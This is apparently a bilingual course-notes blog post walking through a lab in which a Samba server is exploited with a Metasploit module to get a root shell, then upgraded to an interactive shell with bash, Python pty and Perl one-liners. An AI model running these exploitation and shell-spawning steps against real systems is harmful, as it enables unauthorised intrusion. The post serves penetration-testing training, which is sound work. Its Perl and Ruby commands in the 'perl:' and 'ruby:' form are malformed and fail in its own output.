---
layout: post
title: "Upgrading Non-Interactive Shells"
date: "2023-06-25"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Upgrading Non-Interactive Shells（升级非交互式Shell）
# Demo: Upgrading Non-Interactive Shells（演示：升级非交互式Shell）
This is pertinent to Linux post exploitation.

We have exploited a few Linux systems. And one of the things you might have seen is that we, in some cases, have obtained a command shell session. And the command shell session was a little bit weird, because it didn't provide me with a prompt or it didn't give me any indication as to whether or not I can type in commands or I'm interacting with the target system that I've just compromised. And in order to obtain a semi-interactive shell, we typed in the command `/bin/bash -i`, and that provided us with a bash session. And that is an interactive shell. I'm going to be explaining why you should upgrade noninteractive shells and why they are counterproductive and aren't that useful. And that's why I recommend this process.

counterproductive的意思是“产生相反的效果，事与愿违”。

We are going to start off by exploiting the target system. Once we obtain the command shell session, I'll then take you through the various techniques that you can utilize to upgrade the noninteractive shell into an interactive shell.

Kali Linux : 192.185.44.2

Target IP Address : 192.185.44.3

```
msfconsole
setg RHOSTS 192.185.44.3
use exploit/linux/samba/is_known_pipename
show options
exploit
```

This will provide us with a noninteractive shell. It really is noninteractive. This is not just limited to Metasploit Framework exploit modules. A noninteractive shell can also be obtained through a Netcat reverse shell listener.

If you have ever exploited a Linux system in some cases, you may be provided with a noninteractive shell. And one of the easiest ways to identify that it is noninteractive is that it doesn't provide you with a prompt. 

``` 
ls
pwd
```

That would provide me with an interactive bash session. 

```
/bin/bash -i
exit
```

The first thing I recommend that you do is display the list of shells that is installed on the target system.

```
cat /etc/shells
```

Because the Bourne shell or `/bin/sh` is installed.

```
/bin/sh -i
```

That will provide me with a simple Bourne shell session.

```
ls
pwd
exit
```

If you have Python installed, then you can also obtain a bash session or a Bourne shell if you want.

The quickest way of identifying whether Python is installed is by typing in:

```
python --version
```

If it is installed

```
python -c 'import pty; pty.spawn("/bin/bash")'
exit
```

This will allow us to spawn a pty session. I'll specify the shell that we would like to execute. I also obtain a bash session.

There's multiple techniques that you can use to obtain an interactive session. This video is directly targeted towards scenarios where you've obtained a command shell session with Netcat. And in that case, you can't upgraded to meterpreter directly unless you generate a payload with msfvenom and then somehow transfer it onto the target system, execute it, and then receive the connection.

It'll all come down to what utilities or shells you have installed in addition to the interpreters you have installed. If the Python interpreter is installed, then you can use Python to spawn a bash session in addition to a Bourne shell session or `/bin/sh` session.

If you have Perl installed

```  
perl --help
```

```
perl -e 'exec "/bin/bash";'
```

```
perl: exec "/bin/bash";
```

If Ruby is installed

```
ruby: exec "/bin/bash"
```

It's all going to depend on what interpreters are installed.

You'll get a bash session.

```
/bin/bash -i
```

One additional thing that you want to check or do after you have obtained an interactive shell is to display the environment variables.

```
env
```

And in this case, we have a few issues here. For one, the PATH environment variable that is used to specify the default path that will be used to search for a binary when you type in a command is not specified.

I recommend setting that up.

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

That is going to set the PATH environment variable.

```
env
```

I can also set the TERM variable.

```
export TERM=xterm
```

Set the SHELL environment variable to bash.

```
export SHELL=bash
```

```
env
```

This is just ensures that the interactive shell that you've obtained is fully functional.

```
ls -alps
```

We can check whether specific utilities are installed.

```
top
wget
```

# Upgrading Non-Interactive Shells
## Overview
Goal

This lab covers the process of upgrading non-interactive shells.

# 升级非交互式 shell
## 概述
目标

本实验涵盖了升级非交互式 shell 的过程。

## 复现视频内容
Kali Linux : 192.124.187.2

Target IP Address : 192.124.187.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
[ ok ] Starting PostgreSQL 11 database server: main.
msf5 > setg RHOSTS 192.124.187.3
RHOSTS => 192.124.187.3
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.124.187.3    yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > exploit

[*] 192.124.187.3:445 - Using location \\192.124.187.3\exploitable\tmp for the path
[*] 192.124.187.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.124.187.3:445 - Share 'exploitable' has server-side path '/
[*] 192.124.187.3:445 - Uploaded payload to \\192.124.187.3\exploitable\tmp\CenBRbGr.so
[*] 192.124.187.3:445 - Loading the payload from server-side path /tmp/CenBRbGr.so using \\PIPE\/tmp/CenBRbGr.so...
[-] 192.124.187.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.124.187.3:445 - Loading the payload from server-side path /tmp/CenBRbGr.so using /tmp/CenBRbGr.so...
[+] 192.124.187.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.124.187.2:42215 -> 192.124.187.3:445) at 2023-06-25 11:46:33 +0000
```

```
ls
pwd
/tmp
```

```
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/tmp# exit
exit
exit
```

```
cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```

```
/bin/sh -i
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
```

```
/bin/dash -i
/bin/dash: 0: can't access tty; job control turned off
# whoami
root
# exit
```

```
/bin/rbash -i
rbash: cannot set terminal process group (8): Inappropriate ioctl for device
rbash: no job control in this shell
root@victim-1:/tmp# pwd         
pwd
/tmp
root@victim-1:/tmp# exit
exit
exit
```

```
python --version
Python 2.7.9
python -c 'import pty; pty.spawn("/bin/bash")'
root@victim-1:/tmp# exit
exit
exit
```

```
perl --help

Usage: perl [switches] [--] [programfile] [arguments]
  -0[octal]         specify record separator (\0, if no argument)
  -a                autosplit mode with -n or -p (splits $_ into @F)
  -C[number/list]   enables the listed Unicode features
  -c                check syntax only (runs BEGIN and CHECK blocks)
  -d[:debugger]     run program under debugger
  -D[number/list]   set debugging flags (argument is a bit mask or alphabets)
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
  -f                don't do $sitelib/sitecustomize.pl at startup
  -F/pattern/       split() pattern for -a switch (//'s are optional)
  -i[extension]     edit <> files in place (makes backup if extension supplied)
  -Idirectory       specify @INC/#include directory (several -I's allowed)
  -l[octal]         enable line ending processing, specifies line terminator
  -[mM][-]module    execute "use/no module..." before executing program
  -n                assume "while (<>) { ... }" loop around program
  -p                assume loop like -n but print line also, like sed
  -s                enable rudimentary parsing for switches after programfile
  -S                look for programfile using PATH environment variable
  -t                enable tainting warnings
  -T                enable tainting checks
  -u                dump core after parsing program
  -U                allow unsafe operations
  -v                print version, patchlevel and license
  -V[:variable]     print configuration summary (or a single Config.pm variable)
  -w                enable many useful warnings
  -W                enable all warnings
  -x[directory]     ignore text before #!perl line (optionally cd to directory)
  -X                disable all warnings
  
Run 'perldoc perl' for more help with Perl.
```

```
perl -e 'exec "/bin/bash";'
```

```
perl: exec "/bin/bash";
/bin/bash: line 1: perl:: command not found
```

```
ruby: exec "/bin/bash"
/bin/bash: line 2: ruby:: command not found
```

```
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/tmp# 
```

```
root@victim-1:/tmp# env
env
PWD=/tmp
SHLVL=2
_=/usr/bin/env
```

```
root@victim-1:/tmp# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin    
<PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin           
root@victim-1:/tmp# env
env
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/tmp
SHLVL=2
_=/usr/bin/env
```

```
root@victim-1:/tmp# export TERM=xterm
export TERM=xterm
root@victim-1:/tmp# export SHELL=bash
export SHELL=bash
root@victim-1:/tmp# env
env
SHELL=bash
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/tmp
SHLVL=2
_=/usr/bin/env
```

```
root@victim-1:/tmp# top
top
top: failed tty get
root@victim-1:/tmp# wget
wget
wget: missing URL
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
```